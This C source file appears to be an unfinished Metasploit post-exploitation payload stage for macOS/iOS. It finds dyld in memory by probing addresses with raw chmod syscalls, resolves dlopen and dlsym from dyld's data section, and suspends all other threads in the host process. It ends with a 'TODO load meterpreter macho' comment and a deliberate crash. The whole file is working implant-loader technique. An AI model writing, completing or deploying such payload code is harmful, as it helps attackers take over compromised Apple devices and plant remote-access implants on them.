#include <stdio.h>
#include <string.h>

#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <mach-o/dyld.h>
#include <mach/mach.h>

#include <dlfcn.h>
#include <asl.h>

#include <sys/types.h>
#include <sys/sysctl.h>

#include <sys/mman.h>

#if __aarch64__
typedef struct mach_header_64 mach_header_t;
typedef struct segment_command_64 segment_command_t;
typedef struct section_64 section_t;
typedef struct nlist_64 nlist_t;
#define MH_MAGIC_T MH_MAGIC_64
#define LC_SEGMENT_T LC_SEGMENT_64
#else
typedef struct mach_header mach_header_t;
typedef struct segment_command segment_command_t;
typedef struct section section_t;
typedef struct nlist nlist_t;
#define MH_MAGIC_T MH_MAGIC
#define LC_SEGMENT_T LC_SEGMENT
#endif

//https://github.com/opensource-apple/dyld/blob/master/configs/dyld.xcconfig - iOS 9.3.4
#ifdef __x86_64
#define DYLD_BASE_ADDRESS 0x7fff5fc00000
#elif __arm64
#define DYLD_BASE_ADDRESS 0x120000000
#elif __arm
#define DYLD_BASE_ADDRESS 0x1fe00000
#else
#endif

static void crash() {
  *(volatile int*)0x41414141 = 0x42424242;
}

struct dyld_cache_header
{
  char        magic[16];        // e.g. "dyld_v0     ppc"
  uint32_t    mappingOffset;    // file offset to first shared_file_mapping
  uint32_t    mappingCount;     // number of shared_file_mapping entries
  uint32_t    imagesOffset;     // file offset to first dyld_cache_image_info
  uint32_t    imagesCount;      // number of dyld_cache_image_info entries
  uint64_t    dyldBaseAddress;  // base address of dyld when cache was built
  uint64_t    codeSignatureOffset;
  uint64_t    codeSignatureSize;
  uint64_t    slideInfoOffset;
  uint64_t    slideInfoSize;
  uint64_t    localSymbolsOffset;
  uint64_t    localSymbolsSize;
  char        uuid[16];
};

struct shared_file_mapping 
{
  uint64_t    address;
  uint64_t    size;
  uint64_t    file_offset;
  uint32_t    max_prot;
  uint32_t    init_prot;
};

struct dyld_cache_image_info
{
  uint64_t    address;
  uint64_t    modTime;
  uint64_t    inode;
  uint32_t    pathFileOffset;
  uint32_t    pad;
};

long asm_syscall(const long syscall_number, const long arg1, const long arg2, const long arg3, const long arg4, const long arg5, const long arg6);
int main(int argc, char** argv);
void resolve_dyld_symbol(void* base, void** dlopen_pointer, void** dlsym_pointer);
uint64_t syscall_chmod(uint64_t path, long mode);
uint64_t syscall_shared_region_check_np();
uint32_t syscall_write(uint32_t fd, const char* buf, uint32_t size);
uint64_t find_macho(uint64_t addr, unsigned int increment, unsigned int pointer);
void init();

int main(int argc, char** argv)
{
  init();
  return 0;
}

typedef int (*asl_log_ptr)(aslclient asl, aslmsg msg, int level, const char *format, ...);
asl_log_ptr asl_log_func = 0;

void init()
{
  /*printf("syscall_write\n");*/
  /*syscall_write(1, "lal\n", 4);*/
  /*printf("syscall_write done\n");*/

  /*printf("dyld %p\n", (void*)dyld);*/

  /*typedef void (*dyld_start_ptr)(struct macho_header* asl, int argc, char const**argv, int apple);*/
  /*dyld_start_ptr dyld_start_func = dyld + 0x1000;*/
  /*char *main_argv[] = { "xk", NULL };*/
  /*char *jit_region = (void*)init + 0x10000;*/
  /*memcpy(jit_region, macho_file, sizeof(macho_file));*/
  /*dyld_start_func((struct macho_header*)jit_region, 1, main_argv, 0);*/

  void* dlopen_addr = 0;
  void* dlsym_addr = 0;

  uint64_t start = DYLD_BASE_ADDRESS;
  /*if (sierra) {*/
  /*}*/
  uint64_t dyld = find_macho(start, 0x1000, 0);

  resolve_dyld_symbol(dyld, &dlopen_addr, &dlsym_addr);

  typedef void* (*dlopen_ptr)(const char *filename, int flags);
  typedef void* (*dlsym_ptr)(void *handle, const char *symbol);
  dlopen_ptr dlopen_func = dlopen_addr;
  dlsym_ptr dlsym_func = dlsym_addr;
  void* libsystem = dlopen_func("/usr/lib/libSystem.B.dylib", RTLD_NOW);
  asl_log_func = dlsym_func(libsystem, "asl_log");
  asl_log_func(0, 0, ASL_LEVEL_ERR, "hello from metasploit!!\n");
  asl_log_func(0, 0, ASL_LEVEL_ERR, "hello from metasploit!\n");
  asl_log_func(0, 0, ASL_LEVEL_ERR, "hello from metasploit!\n");
  asl_log_func(0, 0, ASL_LEVEL_ERR, "hello from metasploit!\n");
  asl_log_func(0, 0, ASL_LEVEL_ERR, "hello from metasploit!\n");
  asl_log_func(0, 0, ASL_LEVEL_ERR, "hello from metasploit!!\n");

  // Suspend threads
  typedef mach_port_t (*mach_task_self_ptr)();
  typedef thread_port_t (*mach_thread_self_ptr)();
  typedef kern_return_t (*thread_suspend_ptr)(thread_act_t target_thread);
  typedef kern_return_t (*task_threads_ptr)(task_t task, thread_act_array_t thread_list, mach_msg_type_number_t* thread_count);
  void* libIOKit = dlopen_func("/System/Library/Frameworks/IOKit.framework/Versions/A/IOKit", RTLD_NOW);
  mach_task_self_ptr mach_task_self_func = dlsym_func(libIOKit, "mach_task_self");
  mach_thread_self_ptr mach_thread_self_func = dlsym_func(libIOKit, "mach_thread_self");
  thread_suspend_ptr thread_suspend_func = dlsym_func(libsystem, "thread_suspend");
  task_threads_ptr task_threads_func = dlsym_func(libsystem, "task_threads");
  thread_act_t current_thread = mach_thread_self_func();
  mach_msg_type_number_t thread_count;
  thread_act_array_t thread_list;
  kern_return_t result = task_threads_func(mach_task_self_func(), &thread_list, &thread_count);
  if (!result && thread_count) {
    for (unsigned int i = 0; i < thread_count; ++i) {
      thread_act_t other_thread = thread_list[i];
      if (other_thread != current_thread) {
        thread_suspend_func(other_thread);
      }
    }
  }

  // TODO load meterpreter macho


  crash();
}


uint32_t syscall_write(uint32_t fd, const char* buf, uint32_t size)
{
  return asm_syscall(4, fd, buf, size, 0, 0, 0);
}

uint64_t syscall_chmod(uint64_t path, long mode)
{
  return asm_syscall(15, path, mode, 0, 0, 0, 0);
}

uint64_t syscall_shared_region_check_np()
{
  uint64_t address = 0;
  asm_syscall(294, &address, 0, 0, 0, 0, 0);
  return address;
}

long asm_syscall(const long syscall_number, const long arg1, const long arg2, const long arg3, const long arg4, const long arg5, const long arg6){
  long ret;
#ifdef __x86_64
  asm volatile (
      "movq %1, %%rax\n\t"
      "movq %2, %%rdi\n\t"
      "movq %3, %%rsi\n\t"
      "movq %4, %%rdx\n\t"
      "movq %5, %%rcx\n\t"
      "movq %6, %%r8\n\t"
      "movq %7, %%r9\n\t"
      "syscall"
      : "=a"(ret)
      : "g"(syscall_number), "g"(arg1), "g"(arg2), "g"(arg3), "g"(arg4), "g"(arg5), "g"(arg6)    );
#elif __arm__
  volatile register uint32_t r12 asm("r12") = syscall_number;
  volatile register uint32_t r0 asm("r0") = arg1;
  volatile register uint32_t r1 asm("r1") = arg2;
  volatile register uint32_t r2 asm("r2") = arg3;
  volatile register uint32_t r3 asm("r3") = arg4;
  volatile register uint32_t r4 asm("r4") = arg5;
  volatile register uint32_t r5 asm("r5") = arg6;
  volatile register uint32_t xret asm("r0");
  asm volatile (
      "mov r0, %2\n"
      "mov r1, %3\n"
      "mov r2, %4\n"
      "mov r3, %5\n"
      "mov r4, %6\n"
      "mov r5, %7\n"
      "mov r12, %1\n"
      "swi 0x80\n"
      "mov %0, r0\n"
      : "=r"(xret)
      : "r"(r12), "r"(r0), "r"(r1), "r"(r2), "r"(r3), "r"(r4), "r"(r5)
      : "r0", "r1", "r2", "r3", "r4", "r5", "r12");
  ret = xret;
#elif __aarch64__
  // : ¯\_(ツ)_/¯
	volatile register uint64_t x16 asm("x16") = syscall_number;
	volatile register uint64_t x0 asm("x0") = arg1;
	volatile register uint64_t x1 asm("x1") = arg2;
	volatile register uint64_t x2 asm("x2") = arg3;
	volatile register uint64_t x3 asm("x3") = arg4;
	volatile register uint64_t x4 asm("x4") = arg5;
	volatile register uint64_t x5 asm("x5") = arg6;
	volatile register uint64_t xret asm("x0");
  asm volatile (
      "mov x0, %2\n\t"
      "mov x1, %3\n\t"
      "mov x2, %4\n\t"
      "mov x3, %5\n\t"
      "mov x4, %6\n\t"
      "mov x5, %7\n\t"
      "mov x16, %1\n\t"
      "svc 0x80\n\t"
      "mov %0, x0\n\t"
      : "=r"(xret)
      : "r"(x16), "r"(x0), "r"(x1), "r"(x2), "r"(x3), "r"(x4), "r"(x5)
      : "x0", "x1", "x2", "x3", "x4", "x5", "x16");
  ret = xret;
#endif
  return ret;
}

int string_compare(const char* s1, const char* s2) 
{
  while (*s1 != '\0' && *s1 == *s2)
  {
    s1++;
    s2++;
  }
  return (*(unsigned char *) s1) - (*(unsigned char *) s2);
}

uint64_t find_macho(uint64_t addr, unsigned int increment, unsigned int pointer) 
{
  while(1) {
    uint64_t ptr = addr;
    if (pointer) {
      ptr = *(uint64_t *)ptr;
    }
    unsigned long ret = syscall_chmod(ptr, 0777);
    if (ret == 0x2 && ((int *)ptr)[0] == MH_MAGIC_T) {
      return ptr;
    }

    addr += increment;
  }
  return 0;
}

// Credits: http://blog.tihmstar.net/2018/01/modern-post-exploitation-techniques.html
void resolve_dyld_symbol(void* base, void** dlopen_pointer, void** dlsym_pointer)
{
  struct load_command* lc;
  segment_command_t* sc;
  segment_command_t* data;
  section_t* data_const = 0;
  lc = (struct load_command*)(base + sizeof(mach_header_t));

  for (int i=0;i<((mach_header_t*)base)->ncmds; i++) {
    if (lc->cmd == LC_SEGMENT_T) {
      sc = (struct segment_command*)lc;
      if (string_compare(sc->segname, "__DATA") == 0) {
        data = (struct segment_command*)lc;
        break;
      }
    }
    lc = (struct load_command *)((unsigned long)lc + lc->cmdsize);
  }
  data_const = data + 1;
  for (int i=0; i<data->nsects; i++,data_const++) {
    if (string_compare(data_const->sectname, "__const") == 0) {
      break;
    }
  }
  void **dataConst = base + data_const->offset;

  while (!*dlopen_pointer || !*dlsym_pointer) {
    if (string_compare((char*)(dataConst[0]), "__dyld_dlopen") == 0) {
      *dlopen_pointer = (void*)dataConst[1];
    }
    if (string_compare((char*)(dataConst[0]), "__dyld_dlsym") == 0) {
      *dlsym_pointer = (void*)dataConst[1];
    }
    dataConst += 2;
  }
}

